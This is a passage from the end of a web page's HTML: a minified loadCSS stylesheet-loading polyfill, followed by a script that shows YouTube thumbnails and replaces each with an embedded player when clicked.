b)return a();setTimeout(function(){l(a)})};c.addEventListener&&c.addEventListener("load",k);c.onloadcssdefined=l;l(k);return c};"undefined"!==typeof exports?exports.loadCSS=b:a.loadCSS=b})("undefined"!==typeof global?global:this);
(function(a){if(a.loadCSS){var b=loadCSS.relpreload={};b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(h){return!1}};b.poly=function(){for(var b=a.document.getElementsByTagName("link"),e=0;e<b.length;e++){var d=b[e];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d),d.rel=null)}};if(!b.support()){b.poly();var e=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){a.clearInterval(e)});a.attachEvent&&
a.attachEvent("onload",function(){a.clearInterval(e)})}}})(this);
</script>
<script>
function labnolIframe(div) {
  var iframe = document.createElement('iframe');
  iframe.setAttribute('src', 'https://www.youtube.com/embed/' + div.dataset.id + '?autoplay=1');
  iframe.setAttribute('frameborder', '0');
  iframe.setAttribute('allowfullscreen', '1');
  iframe.setAttribute('allow', 'accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture');
  div.parentNode.replaceChild(iframe, div);
}

function initYouTubeVideos() {
  var playerElements = document.querySelectorAll('.youtube-player');
  for (var n = 0; n < playerElements.length; n++) {
    var videoId = playerElements[n].dataset.id;
    var div = document.createElement('div');
    div.setAttribute('data-id', videoId);
    var thumbNode = document.createElement('img');
    thumbNode.src = '//i.ytimg.com/vi/ID/hqdefault.jpg'.replace('ID', videoId);
    div.appendChild(thumbNode);
    var playButton = document.createElement('div');
    playButton.setAttribute('class', 'play');
    div.appendChild(playButton);
    div.onclick = function () {
      labnolIframe(this);
    };
    playerElements[n].appendChild(div);
  }
}

document.addEventListener('DOMContentLoaded', initYouTubeVideos);
</script>
</body>
</html>

